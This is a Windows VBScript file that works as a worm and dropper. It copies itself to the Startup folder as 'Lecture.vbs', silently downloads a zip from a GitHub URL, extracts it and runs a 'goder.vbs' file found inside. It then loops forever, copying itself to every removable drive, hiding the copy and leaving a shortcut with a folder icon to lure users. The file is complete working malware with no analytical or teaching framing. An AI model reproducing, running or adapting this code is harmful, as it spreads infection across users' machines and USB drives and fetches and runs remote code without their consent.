Dim objFSO, objShell, objFolder, objFile

' Initialize objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Execute "C:" command in cmd
objShell.Run "cmd /c C:", 0, True

' Define paths
Dim startupFolderPath, selfScriptPath, selfScriptName, lectureScriptPath
startupFolderPath = objShell.SpecialFolders("Startup")
selfScriptPath = WScript.ScriptFullName
selfScriptName = objFSO.GetFileName(selfScriptPath)
lectureScriptPath = startupFolderPath & "\" & "Lecture.vbs"

' Check if Lecture.vbs exists in startup folder
If Not objFSO.FileExists(lectureScriptPath) Then
    ' Copy itself to startup folder as Lecture.vbs
    objFSO.CopyFile selfScriptPath, lectureScriptPath
End If

' Continue with the rest of the code

' Execute "C:" command in cmd
objShell.Run "cmd /c C:", 0, True

' Define paths
Dim megaFolderPath, zipFilePath, zipExtractPath, url
megaFolderPath = "C:\Mega"
zipFilePath = megaFolderPath & "\MEGAcmd.zip"
zipExtractPath = megaFolderPath & "\MEGAcmd"
url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"

' Check if Mega folder exists
If Not objFSO.FolderExists(megaFolderPath) Then
    ' Create Mega folder if it doesn't exist
    objFSO.CreateFolder(megaFolderPath)
    
    ' Download the zip file
    objShell.Run "cmd /c C:", 0, True
    objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')""", 0, True
    
    ' Check if zip file is downloaded
    Do While Not objFSO.FileExists(zipFilePath)
        WScript.Sleep 1000 ' Wait for 1 second
    Loop
    
    ' Extract the zip file
    If objFSO.FileExists(zipFilePath) Then
        Dim objShellApp
        Set objShellApp = CreateObject("Shell.Application")
        objShellApp.Namespace(zipExtractPath).CopyHere objShellApp.Namespace(zipFilePath).Items
        
        ' Check if zip file is extracted
        Do While Not objFSO.FolderExists(zipExtractPath)
            WScript.Sleep 1000 ' Wait for 1 second
        Loop
        
        ' Delete the zip file
        If objFSO.FolderExists(zipExtractPath) Then
            objFSO.DeleteFile(zipFilePath)
        End If
        
        ' Run file
        If objFSO.FolderExists(zipExtractPath) Then
            objShell.Run "cmd /c C: && cd " & zipExtractPath & " && goder.vbs", 1, True
        End If
    End If
Else
    ' Run file
    objShell.Run "cmd /c C: && cd " & megaFolderPath & "\MEGAcmd && goder.vbs", 1, True
End If

' Additional feature: Check for removable drive and copy Lecture.vbs if it doesn't exist
Do
    Dim driveLetter, removableDrivePath, lectureOnDrivePath, shortcutPath
    driveLetter = ""
    removableDrivePath = ""
    lectureOnDrivePath = ""
    shortcutPath = ""

    ' Get list of drives
    For Each drive In objFSO.Drives
        If drive.DriveType = 1 Then ' DriveType 1 represents removable drive
            driveLetter = drive.Path
            removableDrivePath = driveLetter & "\"
            lectureOnDrivePath = removableDrivePath & "Lecture.vbs"
            shortcutPath = removableDrivePath & "Lecture.lnk"
            
            ' Check if Lecture.vbs exists on removable drive
            If Not objFSO.FileExists(lectureOnDrivePath) Then
                ' Copy Lecture.vbs to removable drive
                objFSO.CopyFile selfScriptPath, lectureOnDrivePath
                
                ' Create shortcut on removable drive
                Dim objLink
                Set objLink = objShell.CreateShortcut(shortcutPath)
                objLink.TargetPath = lectureOnDrivePath
                ' Set folder icon for the shortcut
                objLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 3"
                objLink.Save
                
                ' Hide Lecture.vbs on removable drive
                objShell.Run "cmd /c attrib +h """ & lectureOnDrivePath & """", 0, True
            End If
        End If
    Next
    
    ' Pause for 5 seconds
    WScript.Sleep 5000
Loop
